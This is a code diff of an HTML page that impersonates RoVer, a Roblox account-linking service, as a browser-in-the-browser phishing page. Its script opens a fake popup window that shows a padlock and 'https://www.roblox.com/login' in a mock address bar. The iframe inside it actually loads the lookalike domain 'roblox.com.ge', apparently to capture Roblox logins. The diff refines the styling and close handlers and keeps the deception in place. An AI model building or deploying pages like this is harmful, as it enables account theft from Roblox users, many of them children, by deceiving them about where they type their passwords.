@@ -1,262 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RoVer – Login</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verify | RoVer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --pink: #ff4dd2;
-      --purple: #9b4dff;
-      --bg-dark: #0e0e10;
-      --panel-dark: #18181b;
-      --text-light: #f5f5f5;
-      --gray: #aaa;
+      --bg: #121216;
+      --card-bg: #1E1E23;
+      --accent: #D01677;
+      --text-light: #E1E1E4;
+      --text-muted: #A0A0A5;
+      --btn-bg: #D01677;
     }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; }
     body {
       font-family: 'Inter', sans-serif;
-      background: radial-gradient(circle at top left, var(--purple), var(--pink));
-      background-attachment: fixed;
+      background: var(--bg);
       color: var(--text-light);
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-
-    /* NAVBAR */
-    nav {
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(10px);
-      display: flex;
+      display:flex;
+      flex-direction:column;
       align-items: center;
-      justify-content: space-between;
-      padding: 14px 24px;
-      position: sticky;
-      top: 0;
-      z-index: 10;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .logo img {
-      height: 36px;
-    }
-
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-    }
-
-    .nav-links a, .btn {
-      color: var(--text-light);
-      text-decoration: none;
-      font-weight: 500;
-      transition: opacity 0.2s ease;
-    }
-
-    .nav-links a:hover, .btn:hover {
-      opacity: 0.8;
-    }
-
-    /* MAIN PANEL */
-    main {
-      flex: 1;
-      display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 40px 16px;
+      padding:20px;
     }
-
-    .panel {
-      background: var(--panel-dark);
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    .card {
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 36px 32px;
       max-width: 400px;
-      width: 100%;
-      padding: 36px 28px;
-      text-align: center;
-      animation: fadeIn 0.6s ease;
+      width:100%;
+      text-align:center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .panel h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
+    .card h1 {
+      font-size: 24px;
       font-weight: 700;
+      margin-bottom: 12px;
     }
-
-    .panel p {
-      color: var(--gray);
+    .card p {
+      color: var(--text-muted);
       font-size: 15px;
       margin-bottom: 24px;
     }
-
-    .login-btn {
-      background: linear-gradient(90deg, var(--pink), var(--purple));
-      color: #fff;
-      border: none;
-      padding: 14px 18px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 8px;
-      width: 100%;
-      cursor: pointer;
-      transition: transform 0.2s ease, opacity 0.2s ease;
+    .btn {
+      display:inline-block;
+      width:100%;
+      padding: 14px 0;
+      background: var(--btn-bg);
+      color: white;
+      font-size:16px;
+      font-weight:600;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      transition: opacity 0.2s ease, transform 0.2s ease;
     }
-
-    .login-btn:hover {
+    .btn:hover {
+      opacity:0.9;
       transform: translateY(-2px);
-      opacity: 0.9;
     }
-
-    /* FOOTER */
-    footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 14px;
-      color: var(--gray);
-      background: rgba(0, 0, 0, 0.3);
+    @media (max-width:500px){
+      .card { padding: 28px 20px; }
+      .card h1 { font-size:20px; }
     }
-
-    /* FAKE POPUP + OVERLAY (unchanged) */
-    .fake-popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 90%;
-      max-width: 700px;
-      height: 600px;
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.8);
-      overflow: hidden;
-      z-index: 1000;
-      border: 1px solid #ccc;
-    }
-
-    .window-bar {
-      background: #e0e0e0;
-      height: 36px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 12px;
-      font-size: 14px;
-      font-weight: bold;
-      color: #333;
-      border-bottom: 1px solid #ccc;
-    }
-
-    .popup-close {
-      font-size: 20px;
-      cursor: pointer;
-      color: #666;
-    }
-
-    .popup-close:hover { color: red; }
-
-    .url-bar {
-      background: #f4f4f4;
-      border: 1px solid #ccc;
-      margin: 10px;
-      padding: 6px 10px;
-      border-radius: 6px;
-      font-size: 13px;
-      font-family: monospace;
-      color: #333;
-      overflow: hidden;
-      white-space: nowrap;
-      text-overflow: ellipsis;
-    }
-
-    .popup-iframe {
-      width: 100%;
-      height: calc(100% - 76px);
-      border: none;
-    }
-
+    /* Popup & overlay preserved */
     .overlay {
       display: none;
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0,0,0,0.65);
-      z-index: 999;
+      top:0; left:0;
+      width:100vw; height:100vh;
+      background: rgba(0,0,0,0.7);
+      z-index:1000;
     }
-
-    /* RESPONSIVE */
-    @media (max-width: 600px) {
-      .panel {
-        padding: 28px 20px;
-      }
-      .panel h1 {
-        font-size: 22px;
-      }
+    .fake-popup {
+      display: none;
+      position: fixed;
+      top:50%; left:50%;
+      transform: translate(-50%, -50%);
+      width:90%; max-width:700px;
+      height:600px;
+      background: #fff;
+      border-radius:10px;
+      overflow:hidden;
+      z-index:1001;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+    }
+    .window-bar {
+      height: 36px;
+      background: #f4f4f4;
+      display:flex;
+      align-items:center;
+      justify-content: space-between;
+      padding: 0 12px;
+      font-size:14px;
+      color:#333;
+    }
+    .popup-close {
+      font-size:20px;
+      cursor:pointer;
+      color:#666;
+    }
+    .url-bar {
+      margin:10px;
+      padding:6px 10px;
+      background:#fafafa;
+      border:1px solid #e2e2e2;
+      font-family: monospace;
+      font-size:13px;
+      color:#333;
+      border-radius:6px;
+    }
+    .popup-iframe {
+      width:100%;
+      height: calc(100% - 76px);
+      border:none;
     }
   </style>
 </head>
 <body>
-  <nav>
-    <div class="logo">
-      <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
-    </div>
-    <div class="nav-links">
-      <a href="#">Help</a>
-      <a href="#">Team Members</a>
-      <a href="#">RoVer Plus</a>
-    </div>
-  </nav>
 
-  <main>
-    <div class="panel">
-      <h1>Link Roblox Account</h1>
-      <p>You’ll be redirected to Roblox for verification.</p>
-      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
-    </div>
-  </main>
+  <div class="card">
+    <h1>Link your Roblox account</h1>
+    <p>You will be redirected to Roblox to complete verification.</p>
+    <button class="btn" id="loginBtn">Log in with Roblox</button>
+  </div>
 
-  <footer>
-    © 2025 RoVer. All rights reserved.
-  </footer>
-
-  <!-- Overlay + Popup -->
+  <!-- Overlay & Popup -->
   <div class="overlay" id="overlay"></div>
-
   <div class="fake-popup" id="fakePopup">
     <div class="window-bar">
       ROBLOX
       <div class="popup-close" id="popupClose">&times;</div>
     </div>
     <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
-    <iframe class="popup-iframe" id="popupIframe"></iframe>
+    <iframe class="popup-iframe" id="popupIframe" title="Roblox login"></iframe>
   </div>
 
   <script>
     const loginBtn = document.getElementById("loginBtn");
     const fakePopup = document.getElementById("fakePopup");
-    const popupClose = document.getElementById("popupClose");
     const overlay = document.getElementById("overlay");
+    const popupClose = document.getElementById("popupClose");
     const iframe = document.getElementById("popupIframe");
     const urlDisplay = document.getElementById("urlDisplay");
 
@@ -264,8 +151,8 @@
       const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
       const fakeUrl = "https://www.roblox.com/login";
 
-      fakePopup.style.display = "block";
       overlay.style.display = "block";
+      fakePopup.style.display = "block";
       iframe.src = "";
       urlDisplay.textContent = fakeUrl;
 
@@ -273,10 +160,17 @@
     });
 
     popupClose.addEventListener("click", () => {
-      fakePopup.style.display = "none";
       overlay.style.display = "none";
+      fakePopup.style.display = "none";
+      iframe.src = "";
+    });
+
+    overlay.addEventListener("click", () => {
+      overlay.style.display = "none";
+      fakePopup.style.display = "none";
       iframe.src = "";
     });
   </script>
+
 </body>
 </html>
